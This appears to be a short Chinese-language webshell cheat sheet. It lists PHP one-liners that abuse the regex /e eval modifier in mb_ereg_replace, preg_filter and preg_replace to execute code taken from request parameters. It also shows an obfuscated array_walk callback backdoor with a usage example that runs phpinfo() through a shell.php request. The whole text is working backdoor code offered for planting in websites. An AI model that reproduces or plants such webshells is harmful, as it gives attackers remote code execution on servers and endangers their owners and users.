<?php 
    mb_ereg_replace('\d', $_REQUEST['x'], '1', 'e');
?>

<?php 
    preg_filter('|\d|e', $_REQUEST['x'], '2');
?>

use like:

```

<?php 
  $e = $_REQUEST['e'];
  $arr = array($_POST['x'] => '|.*|e',);
    array_walk($arr, $e, '');
?>
此时提交如下 payload 的话：

Php
shell.php?e=preg_replace
最后就相当于执行了如下语句：

Php
preg_replace('|.*|e',$_POST['x'],'')
这个时候只需要 POST x=phpinfo();

```
